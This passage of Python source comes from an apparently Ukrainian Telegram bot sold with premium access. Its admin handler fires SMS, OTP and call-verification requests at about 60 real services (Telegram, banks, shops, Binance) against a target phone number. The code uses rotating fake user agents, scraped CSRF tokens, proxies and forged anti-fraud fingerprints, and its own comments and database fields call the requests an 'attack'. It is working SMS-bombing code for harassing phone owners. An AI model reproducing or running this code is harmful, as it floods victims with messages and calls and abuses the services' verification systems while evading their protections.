    user_id = callback_query.from_user.id
    if await check_subscription_status(user_id):
        async with db_pool.acquire() as conn:
            user_exists = await conn.fetchval('SELECT 1 FROM users WHERE user_id = $1', user_id)
            
            if not user_exists:
                # Додаємо нового користувача
                await add_user(callback_query.from_user.id, callback_query.from_user.full_name, callback_query.from_user.username)
                
                # Перевіряємо VIP статус
                if not await check_vip_status(user_id):
                    await callback_query.message.edit_text(
                        "🔒 <b>Premium доступ недоступний</b>\n\n"
                        "На жаль, у вас немає Premium статусу для використання бота.\n"
                        "Для отримання доступу зверніться до адміністратора.",
                        parse_mode="HTML"
                    )
                    await callback_query.answer("Потрібен Premium статус", show_alert=True)
                    return
                
                welcome_text = f"🎉 Ласкаво просимо, {callback_query.from_user.first_name}!\n\n"
                welcome_text += "🎯 Ви успішно підписалися і тепер можете користуватися ботом.\n\n"
                
                await callback_query.message.edit_text(welcome_text, parse_mode='HTML')
                await callback_query.message.answer("Оберіть дію:", reply_markup=profile_keyboard)
            else:
                # Перевіряємо VIP статус для існуючих користувачів
                if not await check_vip_status(user_id):
                    await callback_query.message.edit_text(
                        "🔒 <b>Premium доступ недоступний</b>\n\n"
                        "На жаль, у вас немає Premium статусу для використання бота.\n"
                        "Для отримання доступу зверніться до адміністратора.",
                        parse_mode="HTML"
                    )
                    await callback_query.answer("Потрібен Premium статус", show_alert=True)
                    return
                
                welcome_text = f"🎉 З поверненням, дуже на тебе чекали, {callback_query.from_user.first_name}!\n\n"
                welcome_text = 'Використовуючи бота ви автоматично погоджуєтесь з <a href="https://telegra.ph/Umovi-vikoristannya-10-26-2">умовами використання</a>\n\n'

                
                await callback_query.message.edit_text(welcome_text, parse_mode='HTML')
                await callback_query.message.answer("Оберіть дію:", reply_markup=profile_keyboard)
    else:
        await callback_query.answer("Ви ще не підписалися на канал!", show_alert=True)

@dp.message_handler(commands=['admin'])
async def admin(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer(f'{message.from_user.first_name}, оберіть дію👇', reply_markup=admin_keyboard)
    else:
        await message.answer('☝️Ви не адміністратор')

@dp.message_handler(text="Перевірити проксі")
async def admin_check_and_report_proxies(message: Message):
    if message.from_user.id not in ADMIN:
        await message.answer("Недостатньо прав.")
        return
    placeholder = await message.answer("Перевіряю проксі…")
    stats = await check_and_update_proxies()
    lines = [f"Перевірено: {stats['total']}. Робочих: {stats['healthy']}.", ""]
    
    for item in proxies_stats:
        e = item["entry"]
        key = proxy_key(e)
        
        # Обчислюємо реальну стабільність на основі успішних/неуспішних запитів
        success_count = proxies_success.get(key, 0)
        failed_count = proxies_failed.get(key, 0)
        total_requests = success_count + failed_count
        
        if total_requests > 0:
            stability_pct = round((success_count / total_requests) * 100, 1)
        else:
            # Якщо немає реальних даних, використовуємо дані з перевірки
            check_success_rate = item.get('success_rate', 1.0)
            stability_pct = round(check_success_rate * 100, 1)
        
        latency_ms = int(item.get('latency_ms', 0))
        lines.append(f"• {e['host']}:{e['port']} ({e['user']}) — {latency_ms} ms — Стабільність: {stability_pct}%")
        
        # Додаткова інформація про реальне використання
        if total_requests > 0:
            lines.append(f"  └ Успішних: {success_count}, Неуспішних: {failed_count} (всього: {total_requests})")
    
    try:
        await bot.edit_message_text("\n".join(lines), chat_id=placeholder.chat.id, message_id=placeholder.message_id)
    except Exception:
        await message.answer("\n".join(lines))

@dp.message_handler(text="Перевірити сервіси")
async def admin_check_services(message: Message):
    if message.from_user.id not in ADMIN:
        await message.answer("Недостатньо прав.")
        return
    
    placeholder = await message.answer("Перевіряю сервіси…")
    
    # Тестовий номер для перевірки
    test_number = "380969999999"
    formatted_number = f"+{test_number[:2]} {test_number[2:5]} {test_number[5:8]} {test_number[8:10]} {test_number[10:]}"
    formatted_number2 = f"+{test_number[:2]}+({test_number[2:5]})+{test_number[5:8]}+{test_number[8:10]}+{test_number[10:]}"
    formatted_number3 = f"+{test_number[:2]}+({test_number[2:5]})+{test_number[5:8]}+{test_number[8:]}"
    formatted_number4 = f"+{test_number[:2]}({test_number[2:5]}){test_number[5:8]}-{test_number[8:10]}-{test_number[10:]}"
    formatted_number5 = f"+{test_number[:3]}({test_number[3:6]}){test_number[6:9]}-{test_number[9:11]}-{test_number[11:]}"
    formatted_number6 = f"+{test_number[:3]}({test_number[3:5]}){test_number[5:8]}-{test_number[8:10]}-{test_number[10:]}"
    formatted_number7 = f"+{test_number[:3]}({test_number[3:6]}) {test_number[6:9]}-{test_number[9:11]}-{test_number[11:]}"
    formatted_number9 = f"+{test_number[:2]} ({test_number[2:5]}) {test_number[5:8]}-{test_number[8:10]}-{test_number[10:]}"
    
    headers = {"User-Agent": fake_useragent.UserAgent().random}
    
    # Отримуємо CSRF токени та інші необхідні дані
    csrf_url = "https://auto.ria.com/iframe-ria-login/registration/2/4"
    csrf_token = None
    try:
        csrf_token = await get_csrf_token(csrf_url, headers=headers)
    except Exception:
        pass
    
    finbert_csrf_token = None
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://finbert.ua/auth/register/", headers=headers_finbert, cookies=cookies_finbert) as response:
                html = await response.text()
                soup = BeautifulSoup(html, "html.parser")
                csrf_input = soup.find("input", {"name": "csrfmiddlewaretoken"})
                if csrf_input:
                    finbert_csrf_token = csrf_input.get("value")
    except Exception:
        pass
    
    brabrabra_sessid = None
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://brabrabra.ua/auth/modal.php?login=yes&ajax_mode=Y", headers=headers_brabrabra, cookies=cookies_brabrabra) as response:
                html = await response.text()
                soup = BeautifulSoup(html, "html.parser")
                sessid_input = soup.find("input", {"name": "sessid"})
                if sessid_input:
                    brabrabra_sessid = sessid_input.get("value")
                else:
                    brabrabra_sessid = cookies_brabrabra.get("PHPSESSID", "")
    except Exception:
        brabrabra_sessid = cookies_brabrabra.get("PHPSESSID", "")
    
    # Отримуємо CSRF токен та cookies для megogo
    megogo_csrf_token = None
    megogo_cookies = None
    try:
        megogo_auth_url = "https://megogo.net/ua/auth_login"
        async with aiohttp.ClientSession() as session:
            async with session.get(megogo_auth_url, headers=headers) as response:
                # Отримуємо cookies з відповіді (конвертуємо SimpleCookie в словник)
                megogo_cookies = {key: morsel.value for key, morsel in response.cookies.items()}
                # Спробуємо отримати CSRF токен з cookies (PLAY_SESSION містить csrfToken)
                play_session = megogo_cookies.get("PLAY_SESSION", "")
                if play_session:
                    try:
                        # PLAY_SESSION це JWT токен, який містить csrfToken в payload
                        # Розділяємо JWT на частини
                        play_session_str = str(play_session)
                        parts = play_session_str.split(".")
                        if len(parts) >= 2:
                            # Декодуємо payload (друга частина)
                            payload = parts[1]
                            # Додаємо padding якщо потрібно
                            padding = 4 - len(payload) % 4
                            if padding != 4:
                                payload += "=" * padding
                            decoded_bytes = base64.urlsafe_b64decode(payload)
                            decoded_str = decoded_bytes.decode('utf-8')
                            # Спробуємо розпарсити як JSON
                            try:
                                data = json.loads(decoded_str)
                                if "data" in data and "csrfToken" in data["data"]:
                                    megogo_csrf_token = data["data"]["csrfToken"]
                            except (json.JSONDecodeError, ValueError):
                                # Якщо не JSON, спробуємо знайти csrfToken в рядку
                                if "csrfToken" in decoded_str:
                                    match = re.search(r'"csrfToken"\s*:\s*"([^"]+)"', decoded_str)
                                    if match:
                                        megogo_csrf_token = match.group(1)
                    except Exception:
                        pass
                # Якщо не вдалося отримати з cookies, спробуємо з HTML
                if not megogo_csrf_token:
                    html = await response.text()
                    soup = BeautifulSoup(html, "html.parser")
                    # Шукаємо CSRF токен в meta тегах або input полях
                    csrf_meta = soup.find("meta", {"name": "csrf-token"})
                    if csrf_meta:
                        megogo_csrf_token = csrf_meta.get("content")
                    else:
                        csrf_input = soup.find("input", {"name": "csrfToken"})
                        if csrf_input:
                            megogo_csrf_token = csrf_input.get("value")
    except Exception:
        pass
    
    # Генеруємо дані для TrafficGuard
    trafficguard_sid = str(uuid.uuid4())
    trafficguard_psi = str(uuid.uuid4())
    trafficguard_pc = str(uuid.uuid4())
    trafficguard_ciid = str(uuid.uuid4())
    trafficguard_timestamp = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
    trafficguard_timestamp_u = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
    current_timestamp = int(datetime.utcnow().timestamp() * 1000)
    lksd_data = {"s": trafficguard_sid, "st": current_timestamp, "sod": "duckduckgo.com", "sodt": current_timestamp, "sods": "r", "sodst": current_timestamp}
    trafficguard_lksd = base64.b64encode(json.dumps(lksd_data).encode()).decode()
    ga_client_id = f"GA1.3.{random.randint(1000000000, 9999999999)}.{current_timestamp // 1000}"
    gid_client_id = f"GA1.3.{random.randint(1000000000, 9999999999)}.{current_timestamp // 1000}"
    ga4_client_id = f"GS2.3.s{current_timestamp}$o1$g1$t{current_timestamp}$j{random.randint(10, 99)}$l0$h0"
    cd_data = {"_ga": ga_client_id, "_gid": gid_client_id, "_ga_3X15VBC9L9": ga4_client_id}
    trafficguard_cd = base64.b64encode(json.dumps(cd_data).encode()).decode()
    lpd_data = {"landing_page_url": "https://rozetka.com.ua/", "landing_page_title": "Інтернет-магазин ROZETKA™", "landing_page_referrer": "https://duckduckgo.com"}
    trafficguard_lpd = base64.b64encode(json.dumps(lpd_data).encode()).decode()
    device_info_dict = {"screen_resolution": "800,1800", "available_screen_resolution": "800,1800", "system_version": "Windows 10", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0", "canvas_code": "9f305daa", "audio": "35.749972093850374"}
    trafficguard_device_info = base64.b64encode(json.dumps(device_info_dict).encode()).decode()
    bf_string = f"{device_info_dict.get('user_agent', '')}{device_info_dict.get('screen_resolution', '')}{device_info_dict.get('canvas_code', '')}{device_info_dict.get('audio', '')}"
    trafficguard_bf = hashlib.md5(bf_string.encode()).hexdigest()
    
    monto_device_id = str(uuid.uuid4())
    monto_fingerprint = monto_device_id
    
    # Список всіх сервісів для перевірки
    services_to_check = [
        ("База даних", "db_check", None, None),
        ("Проксі", "proxy_check", None, None),
        ("Бот", "bot_check", None, None),
        ("Telegram", "https://my.telegram.org/auth/send_password", {"data": {"phone": "+" + test_number}, "headers": headers}, None),
        ("Helsi", "https://helsi.me/api/healthy/v2/accounts/login", {"json": {"phone": test_number, "platform": "PISWeb"}, "headers": headers}, None),
        ("Helsi Call", "https://helsi.me/api/healthy/v2/accounts/call", {"json": {"phone": test_number, "platform": "PISWeb"}, "headers": headers}, None),
        ("Multiplex", "https://auth.multiplex.ua/login", {"json": {"login": "+" + test_number}, "headers": headers}, None),
        ("PizzaDay", "https://api.pizzaday.ua/api/V1/user/sendCode", {"json": {"applicationSend": "sms", "lang": "uk", "phone": test_number}, "headers": headers}, None),
        ("StationPizza", "https://stationpizza.com.ua/api/v1/auth/phone-auth", {"json": {"needSubscribeForNews": "false", "phone": formatted_number}, "headers": headers}, None),
        ("TakeUseat", "https://core.takeuseat.in.ua/auth/user/requestSMSVerification", {"json": {"phone": "+" + test_number}, "headers": headers}, None),
        ("Aurum", "https://aurum.in.ua/local/ajax/authorize.php?lang=ua", {"json": {"phone": formatted_number, "type": ""}, "headers": headers}, None),
        ("PizzaTime", "https://pizza-time.eatery.club/site/v1/pre-login", {"json": {"phone": test_number}, "headers": headers}, None),
        ("IQ-Pizza", "https://iq-pizza.eatery.club/site/v1/pre-login", {"json": {"phone": test_number}, "headers": headers}, None),
        ("Дніпро", "https://dnipro-m.ua/ru/phone-verification/", {"json": {"phone": test_number}, "headers": headers_dnipro, "cookies": cookies_dnipro}, None),
        ("Citrus", "https://my.ctrs.com.ua/api/auth/login", {"json": {"identity": "+" + test_number}, "headers": headers_citrus, "cookies": cookies_citrus}, None),
        ("EasyPay", "https://auth.easypay.ua/api/check", {"json": {"phone": test_number}, "headers": headers_easypay}, None),
        ("Sandalini", "https://sandalini.ua/ru/signup/", {"data": {"data[firstname]": "деня", "data[phone]": formatted_number2, "wa_json_mode": "1", "need_redirects  ": "1", "contact_type": "person"}, "headers": headers}, None),
        ("UVape", "https://uvape.pro/index.php?route=account/register/add", {"data": {"firstname": "деня", "telephone": formatted_number3, "email": "random@gmail.com", "password": "VHHsq6b#v.q>]Fk"}, "headers": headers_uvape, "cookies": cookies_uvape}, None),
        ("VandalVape", "https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", {"data": {"phone": formatted_number4, "only_sms": "1"}, "headers": headers}, None),
        ("TerraVape", "https://terra-vape.com.ua/index.php?route=common/modal_register/register_validate", {"data": {"firstname": "деня", "lastname": "деневич", "email": "randi@gmail.com", "telephone": test_number, "password": "password24-", "smscode": "", "step": "first_step"}, "headers": headers_terravape, "cookies": cookies_terravape}, None),
        ("Comfy", "https://im.comfy.ua/api/auth/v3/otp/send", {"json": {"phone": test_number}, "headers": headers}, None),
        ("Moyo", "https://www.moyo.ua/identity/registration", {"data": {"firstname": "деня", "phone": formatted_number5, "email": "rando@gmail.com"}, "headers": headers_moyo, "cookies": cookies_moyo}, None),
        ("Pizza Od", "https://pizza.od.ua/ajax/reg.php", {"data": {"phone": formatted_number4}, "headers": headers}, None),
        ("Sushiya", "https://sushiya.ua/ru/api/v1/user/auth", {"data": {"phone": test_number[2:], "need_skeep": ""}, "headers": headers_sushiya}, None),
        ("Avrora", "https://avrora.ua/index.php?dispatch=otp.send", {"data": {"phone": formatted_number6, "security_hash": "0dc890802de67228597af47d95a7f52b", "is_ajax": "1"}, "headers": headers}, None),
        ("Золота Країна", "https://zolotakraina.ua/ua/turbosms/verification/code", {"data": {"telephone": test_number, "email": "rando@gmail.com", "form_key": "PKRxVkPlQqBlb8Wi"}, "headers": headers_zolota, "cookies": cookies_zolota}, None),
        ("AutoRia", "https://auto.ria.com/iframe-ria-login/registration/2/4", {"data": {"_csrf": csrf_token or "", "RegistrationForm[email]": f"{test_number}", "RegistrationForm[name]": "деня", "RegistrationForm[second_name]": "деневич", "RegistrationForm[agree]": "1", "RegistrationForm[need_sms]": "1"}, "headers": headers_avtoria, "cookies": cookies_avtoria}, None),
        ("Ukrpas", f"https://ukrpas.ua/login?phone=+{test_number}", {"method": 'GET', "headers": headers}, None),
        ("Maslotom", "https://maslotom.com/api/index.php?route=api/account/phoneLogin", {"data": {"phone": formatted_number6}, "headers": headers}, None),
        ("Varus", "https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ua", {"json": {"phone": "+" + test_number}, "headers": headers}, None),
        ("GetVape", "https://getvape.com.ua/index.php?route=extension/module/regsms/sendcode", {"data": {"telephone": formatted_number7}, "headers": headers}, None),
        ("IQOS", "https://api.iqos.com.ua/v1/auth/otp", {"json": {"phone": test_number}, "headers": headers}, None),
        ("LvivKholod", f"https://llty-api.lvivkholod.com/api/client/{test_number}", {"method": 'POST', "headers": headers}, None),
        ("PlanetaKino", "https://api-mobile.planetakino.ua/graphql", {"json": {"query": "mutation customerVerifyByPhone($phone: String!) { customerVerifyByPhone(phone: $phone) { isRegistered }}", "variables": {"phone": "+" + test_number}}, "headers": headers}, None),
        ("Trofim", "https://back.trofim.com.ua/api/via-phone-number", {"json": {"phone": test_number}, "headers": headers}, None),
        ("Robota", "https://dracula.robota.ua/?q=SendOtpCode", {"json": {"operationName": "SendOtpCode", "query": "mutation SendOtpCode($phone: String!) {  users {    login {      otpLogin {        sendConfirmation(phone: $phone) {          status          remainingAttempts          __typename        }        __typename      }      __typename    }    __typename  }}", "variables": {"phone": test_number}}, "headers": headers}, None),
        ("Kyivstar", f"https://shop.kyivstar.ua/api/v2/otp_login/send/{test_number[2:]}", {"method": 'GET', "headers": headers}, None),
        ("Elmir", "https://elmir.ua/response/load_json.php?type=validate_phone", {"data": {"fields[phone]": "+" + test_number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "code"}, "headers": headers_elmir, "cookies": cookies_elmir}, None),
        ("Bars", f"https://bars.itbi.com.ua/smart-cards-api/common/users/otp?lang=uk&phone={test_number}", {"method": 'GET', "headers": headers}, None),
        ("Kolomarket", "https://api.kolomarket.abmloyalty.app/v2.1/client/registration", {"json": {"phone": test_number, "password": "!EsRP2S-$s?DjT@", "token": "null"}, "headers": headers}, None),
        ("Apteka24", "https://ucb.z.apteka24.ua/api/send/otp", {"json": {"phone": test_number}, "headers": headers_apteka24}, None),
        ("Ta-Da", "https://api.ta-da.net.ua/v1.1/mobile/user.auth", {"json": {"phone": formatted_number9}, "headers": headers_ta_da}, None),
        ("Monto", "https://mobilebanking.monto.com.ua/api-web/v1/authorization", {"json": {"form_id": "get_login", "login": test_number}, "headers": {**headers_monto, "device_id": monto_device_id, "fingerprint": monto_fingerprint}, "cookies": cookies_monto}, None),
        ("SmartMedical", "https://smartmedicalcenter.ua/health/", {"data": {"auth_login": test_number[2:], "auth_password": "1234567890"}, "headers": headers_smartmedical, "cookies": cookies_smartmedical}, None),
        ("Silpo", "https://auth.silpo.ua/api/v2/Login/ByPhone?returnUrl=/connect/authorize/callback?client_id=silpo--site--spa&redirect_uri=https%3A%2F%2Fsilpo.ua%2Fsignin-callback-angular.html&response_type=code&scope=public-my%20openid&nonce=62467d1da847556567d91332155e1a20f91fX8X6q&state=7a1776bee43ba28c3ab79191a4e54a4c55ll8naMu&code_challenge=V5cFVVx4xON-EYdzjheeqM2l1K5KUnQ4dDXJ5ROU58Y&code_challenge_method=S256", {"json": {"delivery_method": "sms", "phone": "+" + test_number, "phoneChannelType": 0, "recaptcha": None}, "headers": headers_silpo}, None),
        ("GoodWine", "https://goodwine.com.ua/ua/auth/code/send", {"json": {"username": "+" + test_number}, "headers": headers_goodwine}, None),
        ("Brabrabra", "https://brabrabra.ua/auth/modal.php?login=yes&ajax_mode=Y", {"data": {"sessid": brabrabra_sessid or "", "step": "1", "phone": formatted_number9, "ajax_mode": "Y"}, "headers": headers_brabrabra, "cookies": cookies_brabrabra}, None),
        ("Finbert", "https://finbert.ua/auth/register/", {"data": {"csrfmiddlewaretoken": finbert_csrf_token or "", "phone": "+" + test_number, "cf-turnstile-response": ""}, "headers": headers_finbert, "cookies": cookies_finbert}, None),
        ("Work.ua", "https://www.work.ua/api/v3/jobseeker/auth/", {"json": {"login": formatted_number}, "headers": headers_workua, "cookies": cookies_workua}, None),
        ("Binance", "https://accounts.binance.com/bapi/accounts/v1/public/account/security/request/precheck", {"json": {"bizType": "login", "callingCode": "380", "mobile": test_number[3:], "mobileCode": "UA"}, "headers": headers_binance, "cookies": cookies_binance}, None),
        ("TrafficGuard", "https://api.trafficguard.ai/tg-g-017014-001/api/v4/client-side/validate/event", {"data": {"pgid": "tg-g-017014-001", "sid": trafficguard_sid, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0", "hr": "https://duckduckgo.com/", "pd": "{'name':'javascript_tag','version':'2.10.10'}", "psi": trafficguard_psi, "fpj": "true", "pvc": "1", "e": "registration", "et": trafficguard_timestamp, "etu": trafficguard_timestamp_u, "ep": '{"tag":"tg_68e3b20662f40"}', "tag": "tg_68e3b20662f40", "bua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0", "buad": "{}", "bw": "false", "bl": "uk-UA", "bcd": "24", "bdm": "not available", "bpr": "2", "bhc": "4", "bsr": "900,1800", "bto": "0", "bt": "Atlantic/Reykjavik", "bss": "true", "bls": "true", "bid": "true", "bod": "false", "bcc": "not available", "bnp": "Win32", "bdnt": "unspecified", "babk": "false", "bts": "10, false, false", "bf": trafficguard_bf, "s": "duckduckgo.com", "c": "", "p": "", "crt": "", "c2": "", "k": "", "sei": "", "t": "", "ti": "", "usid": "", "s3": "", "a": "", "csid": "", "pidi": "", "s2": "", "a2": "", "a4": "", "a3": "", "g": "", "wh": "rozetka.com.ua", "wp": "/", "wt": "Інтернет-магазин ROZETKA™", "wu": "https://rozetka.com.ua/", "bipe": "false", "bih": "false", "sis": "", "pci": "", "event_revenue_usd": "", "isc": "", "gid": "", "csi": "javascript_tag", "gc": "", "msclkid": "", "tgclid": "", "tgsid": "", "fbclid": "", "irclid": "", "dcclid": "", "gclsrc": "", "gbraid": "", "wbraid": "", "gac": "", "sipa": "eyJpZCI6ImpzIiwic2MiOiJnZW5lcmF0ZWQifQ==", "sila": "r", "if": "false", "pc": trafficguard_pc, "lksd": trafficguard_lksd, "cd": trafficguard_cd, "cpr": "true", "ciid": trafficguard_ciid, "fuid": "", "fbpxid": "480863978968397", "tid": "", "lpd": trafficguard_lpd, "stpes": "false", "udo": "e30="}, "headers": headers_trafficguard}, None),
        ("Oschadbank", f"https://c2c.oschadbank.ua/api/sms/{test_number}", {"method": 'GET', "headers": headers}, None),
        ("Prosto", f"https://api.prosto.net/v2/verify?type=intl_phone&value={test_number}", {"method": 'GET', "headers": headers}, None),
        ("LA.ua", "https://la.ua/vinnytsya/wp-admin/admin-ajax.php?lang=uk", {"data": {"action": "user_login", "formData": f"tel={urllib.parse.quote(formatted_number9, safe='')}&code=", "nonce": "1d8ce3c7e4"}, "headers": headers_la}, None),
        ("Ta-Da Call", "https://api.ta-da.net.ua/v1.1/mobile/auth.call", {"json": {"phone": formatted_number9}, "headers": headers_ta_da, "method": "PUT"}, None),
        ("Megogo", "https://megogo.net/wb/authForm_v3/authPhone?lang=ua", {"data": {"target_url": "/ua", "login": "+" + test_number, "action": "widget_5", "g-recaptcha-version": "v3", "g-recaptcha-response": ""}, "headers": {**headers, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://megogo.net", "Referer": "https://megogo.net/ua/auth_login", "X-Requested-With": "XMLHttpRequest", "Csrf-Token": megogo_csrf_token or ""}, "cookies": megogo_cookies or {}}, None),
    ]
    
    # Генеруємо protectCode та sign для EVA
    eva_protect_code = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    eva_sign_string = test_number + eva_protect_code
    eva_sign = hashlib.md5(eva_sign_string.encode()).hexdigest()
    services_to_check.append(("EVA", "https://pwa-api.eva.ua/api/user/send-code?storeCode=ua", {"json": {"phone": test_number, "protectCode": eva_protect_code, "sign": eva_sign}, "headers": headers_eva}, None))
    
    async def check_service_status(name, url_or_type, request_params, custom_headers):
        """Перевіряє статус сервісу через тестовий запит"""
        if url_or_type == "db_check":
            try:
                async with db_pool.acquire() as conn:
                    test_query = await conn.fetchval('SELECT 1')
                    if test_query == 1:
                        return "✅"
            except Exception:
                return "❌"
        elif url_or_type == "proxy_check":
            try:
                stats = await check_and_update_proxies()
                if stats['healthy'] > 0:
                    return f"✅ ({stats['healthy']}/{stats['total']})"
                else:
                    return f"⚠️ ({stats['total']})"
            except Exception:
                return "❌"
        elif url_or_type == "bot_check":
            try:
                await bot.send_chat_action(message.chat.id, 'typing')
                return "✅"
            except Exception:
                return "❌"
        else:
            # Виконуємо тестовий запит як при атаці
            try:
                timeout = aiohttp.ClientTimeout(total=5)
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    method = request_params.get('method', 'POST')
                    hdrs = request_params.get('headers', {})
                    hdrs['Accept-Encoding'] = 'gzip, deflate'
                    
                    kwargs = {k: v for k, v in request_params.items() if k != 'method' and k != 'headers'}
                    kwargs['headers'] = hdrs
                    
                    async with session.request(method, url_or_type, **kwargs) as response:
                        response_text = ""
                        try:
                            response_text = await response.text()
                        except Exception:
                            pass
                        
                        # Перевіряємо статус HTTP
                        status_code = response.status
                        
                        # Помилки, які означають що сервіс не працює
                        if status_code in [429, 400, 403, 404, 500, 502, 503, 504]:
                            return f"❌ ({status_code})"
                        
                        # Якщо статус 200-299, перевіряємо тіло відповіді
                        if status_code in [200, 201, 202]:
                            response_lower = response_text.lower()
                            
                            # Перевіряємо на помилки в відповіді
                            error_indicators = [
                                'too many tries',
                                'too many requests',
                                'rate limit',
                                'rate_limit',
                                'captcha',
                                'incapsula',
                                'incapsula_resource',
                                'error',
                                '"error"',
                                '"success":false',
                                '"success": false',
                                'что-то пошло не так',
                                'failed',
                                'failure',
                                'blocked',
                                'forbidden',
                                'not found',
                                'не найдено',
                                'не знайдено'
                            ]
                            
                            has_error = any(indicator in response_lower for indicator in error_indicators)
                            
                            if has_error:
                                return "❌"
                            
                            # Перевіряємо чи відповідь містить ознаки успішної відправки SMS
                            sms_sent_indicators = [
                                'sent', 'success', 'ок', 'успішно', 'sms', 'code sent', 
                                'отправлено', 'отправлен', 'code', 'sms code', 'verification', 
                                'подтверждение', 'підтвердження', 'отримано', 'получено', 
                                '"success":true', '"success": true', '"status":"success"',
                                '"code":"000000"', '"status_code":200'
                            ]
                            
                            sms_confirmed = any(indicator in response_lower for indicator in sms_sent_indicators)
                            
                            if sms_confirmed:
                                return "✅"
                            else:
                                # 200 без підтвердження SMS - частково працює
                                return "⚠️"
                        
                        # Інші статуси (300-499 крім 400, 403, 404)
                        elif status_code < 500:
                            return f"⚠️ ({status_code})"
                        else:
                            return f"❌ ({status_code})"
            except asyncio.TimeoutError:
                return "⏱️"
            except Exception as e:
                return "❌"
    
    # Перевіряємо всі сервіси паралельно
    tasks = []
    service_names = []
    for name, url_or_type, request_params, custom_headers in services_to_check:
        task = check_service_status(name, url_or_type, request_params, custom_headers)
        tasks.append(task)
        service_names.append(name)
    
    # Виконуємо перевірки паралельно
    statuses = await asyncio.gather(*tasks, return_exceptions=True)
    results = list(zip(service_names, statuses))
    
    # Обробляємо винятки
    processed_results = []
    for name, status in results:
        if isinstance(status, Exception):
            processed_results.append((name, "❌"))
        else:
            processed_results.append((name, status))
    results = processed_results
    
    # Формуємо повідомлення
    services_status = []
    working_count = 0
    warning_count = 0
    timeout_count = 0
    error_count = 0
    
    for name, status in results:
        if status == "✅" or status.startswith("✅"):
            working_count += 1
        elif status == "⚠️" or status.startswith("⚠️"):
            warning_count += 1
        elif status == "⏱️":
            timeout_count += 1
        elif status.startswith("❌"):
            error_count += 1
        else:
            error_count += 1
        services_status.append(f"{status} {name}")
    
    summary = f"\n\n📊 <b>Загальний статус:</b>\n"
    summary += f"✅ Працюють: {working_count}\n"
    summary += f"⚠️ Попередження: {warning_count}\n"
    summary += f"⏱️ Таймаут: {timeout_count}\n"
    summary += f"❌ Не працюють: {error_count}\n"
    summary += f"📈 Всього: {len(services_to_check)}"
    
    result_text = "🔍 <b>Статус сервісів:</b>\n\n" + "\n".join(services_status) + summary
    
    try:
        await bot.edit_message_text(result_text, chat_id=placeholder.chat.id, message_id=placeholder.message_id, parse_mode="HTML")
    except Exception:
        await message.answer(result_text, parse_mode="HTML")


@dp.message_handler(text="Статистика бота")
async def bot_stats(message: Message):
    if message.from_user.id in ADMIN:
        async with db_pool.acquire() as conn:
            # Отримуємо загальну кількість користувачів
            total_users = await conn.fetchval('SELECT COUNT(*) FROM users')
            
            # Отримуємо кількість активних користувачів (тих, хто не заблокував бота)
            active_users = 0
            users = await conn.fetch('SELECT user_id FROM users')
            
            for user in users:
                try:
                    # Перевіряємо, чи може бот надіслати повідомлення користувачу
                    await bot.send_chat_action(user['user_id'], 'typing')
                    active_users += 1
                except (BotBlocked, UserDeactivated, ChatNotFound):
                    continue
                except Exception as e:
                    logging.error(f"Помилка при перевірці користувача {user['user_id']}: {e}")
                    continue
            
            # Отримуємо кількість заблокованих користувачів
            blocked_users = await conn.fetchval('SELECT COUNT(*) FROM users WHERE block = 1')
            
            # Активні користувачі за день (ті, хто мав активність сьогодні)
            today = get_kyiv_date()
            active_users_today = await conn.fetchval(
                'SELECT COUNT(*) FROM users WHERE last_attack_date::date = $1',
                today
            )
        
        message_text = (
            f"📊 <b>Статистика бота</b>\n\n"
            f"👥 Всього користувачів: {total_users}\n"
            f"✅ Активних користувачів: {active_users}\n"
            f"📅 Активних користувачів за день: {active_users_today}\n"
            f"🚫 Заблокованих користувачів: {blocked_users}"
        )
        
        await message.answer(message_text, parse_mode="HTML")
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(text='Надіслати повідомлення користувачам')
async def broadcast_prompt(message: Message):
    if message.from_user.id in ADMIN:
        await Dialog.spam.set()
        await message.answer('Введіть повідомлення для користувачів:')
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(state=Dialog.spam, content_types=[types.ContentType.TEXT, types.ContentType.PHOTO, types.ContentType.VIDEO, types.ContentType.DOCUMENT])
async def broadcast_message(message: Message, state: FSMContext):
    text = message.text if message.text else ""
    content_type = "text" if message.text else "unknown"

    if message.photo:
        content_type = "photo"
        photo_id = message.photo[-1].file_id
    elif message.video:
        content_type = "video"
        video_id = message.video.file_id
    elif message.document:
        content_type = "document"
        document_id = message.document.file_id

    async with db_pool.acquire() as conn:
        users = await conn.fetch('SELECT user_id FROM users')
    
    success_count = 0
    error_count = 0

    for user in users:
        user_id = user['user_id']
        try:
            if content_type == "text":
                await bot.send_message(user_id, text)
            elif content_type == "photo":
                await bot.send_photo(user_id, photo_id, caption=text)
            elif content_type == "video":
                await bot.send_video(user_id, video_id, caption=text)
            elif content_type == "document":
                await bot.send_document(user_id, document_id, caption=text)
            success_count += 1
        except BotBlocked:
            logging.error(f"Бота заблокував користувач {user_id}. Пропускаємо його.")
            error_count += 1
        except UserDeactivated:
            logging.error(f"Користувач {user_id} деактивував аккаунт. Пропускаємо його.")
            error_count += 1
        except ChatNotFound:
            logging.error(f"Чат з користувачем {user_id} не знайдено. Пропускаємо його.")
            error_count += 1
        except Exception as e:
            logging.error(f"Помилка при відправленні повідомлення користувачу {user_id}: {str(e)}")
            error_count += 1
        await asyncio.sleep(random.uniform(0.4, 1.1)) # <= Додаєм паузу

    await message.answer(f'Повідомлення відправлено!\nУспішно: {success_count}\nПомилок: {error_count}')
    await state.finish()


@dp.message_handler(commands=['block'])
async def add_to_blacklist(message: Message):
    user_id = message.from_user.id
    args = message.get_args()
    
    if not args:
